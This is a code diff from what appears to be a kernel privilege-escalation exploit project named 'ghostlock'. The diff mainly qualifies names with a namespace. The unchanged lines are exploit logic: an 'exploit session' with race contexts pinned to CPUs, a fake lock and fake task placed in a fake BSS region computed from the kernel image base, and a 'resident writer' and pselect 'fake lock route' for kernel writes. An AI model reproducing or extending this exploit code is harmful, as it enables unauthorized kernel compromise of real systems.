@@ -138,7 +138,7 @@ int kernel5_resident_start(void) {
             context, &ghostlock::g_exploit_session.race, NULL, execution, layout, 1);
     context->main_cpu = runtime_config_snapshot().main_cpu;
     context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
-    uintptr_t bss = resolved_addresses_data_alias(
+    uintptr_t bss = ghostlock::memory::resolved_addresses_data_alias(
             &g_resolved_addresses, KIMAGE_TEXT_BASE + layout.fake_bss_image_offset);
     context->lock = bss + layout.fake_lock_offset;
     context->task = bss + layout.fake_task_offset;
@@ -238,7 +238,7 @@ void kernel5_resident_stop(void) {
     multicast_waiter_disarm(context);
     multicast_waiter_destroy(context);
     /* SESSION-04: the route owns only its route resources; reaping the
-     * HeapContext references is the session's step after destroy. */
+     * ghostlock::memory::HeapContext references is the session's step after destroy. */
     ghostlock::g_exploit_session.release_resident_heap();
     pr_success("5.x resident writer disarmed\n");
 }
@@ -877,7 +877,7 @@ namespace ghostlock::route {
 
 RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
     /* TODO(post-S15:SELECT-01): Compact outer retries must
-     * rebuild both HeapContext payload ownership and PiRaceContext sequencing.
+     * rebuild both ghostlock::memory::HeapContext payload ownership and PiRaceContext sequencing.
      * Keep this route invocation single-shot until ExploitSession can create a
      * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
     SelectStackRouteContext context(
